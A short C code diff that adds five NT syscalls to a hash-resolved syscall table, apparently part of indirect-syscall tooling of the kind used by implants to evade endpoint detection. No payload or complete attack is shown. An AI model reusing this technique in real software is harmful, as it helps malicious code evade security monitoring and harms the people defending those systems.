@@ -23,6 +23,11 @@ typedef struct _SYSCALL_TABLE {
     SYSCALL_ENTRY NtGetContextThread;
     SYSCALL_ENTRY NtSetContextThread;
     SYSCALL_ENTRY NtWaitForSingleObject;
+    SYSCALL_ENTRY NtOpenFile;
+    SYSCALL_ENTRY NtQueryInformationFile;
+    SYSCALL_ENTRY NtCreateSection;
+    SYSCALL_ENTRY NtMapViewOfSection;
+    SYSCALL_ENTRY NtClose;
 } SYSCALL_TABLE;
 
 typedef struct _API_TABLE {
@@ -170,6 +175,11 @@ static void InitializeSyscallTable(SYSCALL_TABLE *tbl, PVOID hNtdll, PVOID gadge
     RESOLVE_SYSCALL(NtGetContextThread,      HASH_NtGetContextThread);
     RESOLVE_SYSCALL(NtSetContextThread,      HASH_NtSetContextThread);
     RESOLVE_SYSCALL(NtWaitForSingleObject,   HASH_NtWaitForSingleObject);
+    RESOLVE_SYSCALL(NtOpenFile,              HASH_NtOpenFile);
+    RESOLVE_SYSCALL(NtQueryInformationFile,  HASH_NtQueryInformationFile);
+    RESOLVE_SYSCALL(NtCreateSection,         HASH_NtCreateSection);
+    RESOLVE_SYSCALL(NtMapViewOfSection,      HASH_NtMapViewOfSection);
+    RESOLVE_SYSCALL(NtClose,                 HASH_NtClose);
 
     #undef RESOLVE_SYSCALL
 }
